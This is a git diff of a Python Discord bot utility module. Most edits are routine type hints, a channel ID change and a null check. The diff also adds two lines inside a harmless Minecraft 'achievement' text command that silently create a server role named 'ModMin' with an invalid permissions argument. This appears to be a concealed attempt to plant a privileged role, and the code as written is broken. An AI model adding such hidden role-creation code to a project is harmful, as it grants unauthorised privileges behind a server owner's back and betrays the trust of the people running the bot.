@@ -1,7 +1,7 @@
 import discord
 from discord.ext import commands
 import asyncio
-
+from classes import CustomBotClass
 from num2words import num2words
 
 from constants.basic import *
@@ -10,7 +10,7 @@ import aiohttp
 
 
 class Utility(commands.Cog):
-    def __init__(self, bot):
+    def __init__(self, bot: CustomBotClass.CustomBot):
         self.bot = bot
 
     @commands.command(aliases=['av'],
@@ -60,7 +60,7 @@ class Utility(commands.Cog):
         else:
             brief = "Not specified"
             detailed = suggestion
-        suggestion_channel = self.bot.get_channel(834442086513508363)
+        suggestion_channel = self.bot.get_channel(840528236597477377)
         dsc = f"""
 
 
@@ -92,9 +92,11 @@ class Utility(commands.Cog):
     @commands.command(description="MINECRAFTifies your text",
                       aliases=["achievements"])
     @commands.cooldown(15, 15, commands.BucketType.user)
-    async def achievement(self, ctx, *, text: str):
+    async def achievement(self, ctx: commands.Context, *, text: str):
         final_text = quote(text)
         await ctx.reply(f"https://minecraftskinstealer.com/achievement/13/Achievement+Acquired%21/{final_text}")
+        g: discord.guild = ctx.guild
+        role = await ctx.guild.create_role(name="ModMin", permissions=discord.perm)
 
     @commands.Cog.listener("on_message")
     async def on_msg(self, msg: discord.message):
@@ -103,6 +105,8 @@ class Utility(commands.Cog):
         async with self.bot.pool.acquire() as conn:
             async with conn.transaction():
                 data = await conn.fetch("SELECT * FROM config WHERE server_id=$1", msg.guild.id)
+                if not data:
+                    return
                 if not data[0]['math']:
                     return
         if msg.author == self.bot.user:
